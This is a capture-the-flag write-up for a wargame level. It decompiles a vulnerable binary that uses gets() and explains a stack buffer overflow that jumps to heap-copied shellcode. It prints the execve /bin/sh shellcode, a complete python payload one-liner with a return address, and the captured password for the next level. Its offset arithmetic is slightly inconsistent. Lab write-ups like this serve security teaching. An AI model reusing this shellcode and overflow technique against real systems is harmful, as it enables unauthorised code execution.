## Flag2 README: Finding Flag2

After connection on our vm with:
```bash
ssh level2@localhost -p 4242
```
We finded a binary program called level1.
if we decompile it we got this
```C
char *p()
{
  char s[64]; // [esp+1Ch] [ebp-4Ch] BYREF
  const void *v2; // [esp+5Ch] [ebp-Ch]
  unsigned int retaddr; // [esp+6Ch] [ebp+4h]

  fflush(stdout);
  gets(s);
  v2 = (const void *)retaddr;
  if ( (retaddr & 0xB0000000) == -1342177280 )
  {
    printf("(%p)\n", v2);
    _exit(1);
  }
  puts(s);
  return strdup(s);
}
```

So the idea was at first to an exploit call retToLibC which the goal is to bufferOverflow and then call a function of the C lib.
like execve("/bin/bash").
But that didn succeed but we have an idea : We can buffer overflow the stack make it call the return of strdup that will have allocated a shellcode and will return it.

The goal of the shell code is to execute bash. So the idea is to build something like this:
"Shell code" + "\x90"(no op) * sizeTo overflow + adress of return strdup.

The shellcode found online:
\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh

we use this to found where we can write in the return adress =
aA00aA01aA02aA03aA04aA05aA06aA07aA08aA09bA00bA01bA02bA03bA04bA05bA06bA07bA08bA09cA00cA01cA02cA03cA04cA05cA06cA07cA08cA09dA00dA01dA02dA03dA04dA05dA06dA07dA08dA09

we found this offset cA00
mean that we will write in the adress at the 80caractere : but because our shell code is 38 byte long we will add 80 - 45 = 35
\x90.

last thing is the return adress of strdup :
For that we run the code normaly we break after the strdup and we print eax bc we know that's in eax where the return adress his.
0x804a008
and we put in litle endian \x08\xa0\x04\x08.

and we build so
```python
python -c 'print("\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh" + "\x90" * 35 + "\x08\xa0\x04\x08")
```
python -c 'print("\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh" + "\x90" * 35 + "\x08\xa0\x04\x08")' > test6

and lets go we are lvl 3
cat .pass
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
